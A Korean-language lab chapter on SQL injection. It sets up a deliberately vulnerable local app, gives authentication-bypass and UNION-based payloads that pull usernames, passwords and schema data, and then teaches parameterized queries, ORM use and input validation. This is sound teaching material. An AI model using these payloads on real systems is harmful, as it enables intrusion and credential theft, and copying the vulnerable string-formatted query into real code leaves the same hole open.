# Chapter 04: SQL Injection 실습

## 학습 목표
- SQL Injection 취약점의 원리 이해
- 공격 기법 실습 (Authentication Bypass, UNION-based)
- Parameterized Query와 ORM을 활용한 방어 구현

## 실습 환경 실행

```bash
# 취약한 버전과 안전한 버전 동시 실행
docker-compose up -d

# 취약한 버전: http://localhost:5001
# 안전한 버전: http://localhost:5002
```

## 실습 1: Authentication Bypass

### 취약한 코드 (vulnerable/app.py:42)
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 공격 방법
1. http://localhost:5001 접속
2. Username: `' OR '1'='1`
3. Password: 아무 값

### 예상 결과
- 비밀번호 없이 로그인 성공
- 실행된 쿼리: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`

## 실습 2: UNION-based SQL Injection

### 공격 방법
1. 검색창에 입력 (검색 쿼리는 3개 컬럼 반환):
```
' UNION SELECT id, username, password FROM users--
```

### 예상 결과
- email 필드에 password가 노출됨
- 실행된 쿼리: `SELECT id, username, email FROM users WHERE username LIKE '%' UNION SELECT id, username, password FROM users--%'`

### 추가 공격 예시
```sql
-- 모든 사용자 정보 추출 (3컬럼 맞춤)
' UNION SELECT id, username || ':' || password, role FROM users--

-- 테이블 정보 추출 (SQLite)
' UNION SELECT 1, name, sql FROM sqlite_master--
```

## 방어 기법

### 1. Parameterized Query (권장)
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2. ORM 사용 (secure/app.py)
```python
user = User.query.filter_by(username=username).first()
```

### 3. 입력값 검증
```python
def validate_username(username: str) -> bool:
    return bool(re.match(r"^[a-zA-Z0-9_]+$", username))
```

## 체크리스트

- [ ] 문자열 포맷팅으로 쿼리 생성하지 않기
- [ ] Parameterized Query 또는 ORM 사용
- [ ] 입력값 화이트리스트 검증
- [ ] 에러 메시지에서 쿼리 정보 숨기기
- [ ] 최소 권한 DB 계정 사용

## 참고 자료
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
